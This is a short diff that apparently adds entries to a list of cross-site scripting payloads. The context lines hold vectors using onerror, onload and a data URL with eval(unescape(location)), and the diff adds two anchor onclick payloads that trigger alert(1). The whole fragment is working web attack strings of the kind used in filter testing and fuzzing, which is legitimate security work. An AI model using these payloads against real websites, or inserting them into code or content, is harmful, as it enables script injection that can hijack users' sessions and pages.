@@ -1421,3 +1421,6 @@ a=%1B$*H%1BN&b=%20type=image%20src=x%20onerror=alert(document.c haracterSet);//
 <body onload=```${prompt``}`>
 <iframe src="http://target" referrerpolicy="no-referrer">
 data:text/html;alert(1)/*,<svg%20onload=eval(unescape(location))><title>*/;alert(2);function%20text(){};function%20html(){}
+<a href="" onclick=``/name==alert(1)>clickme</a>
+<a href="" onclick=``/*/alt="*//alert(1)//">clickme</a>
+>
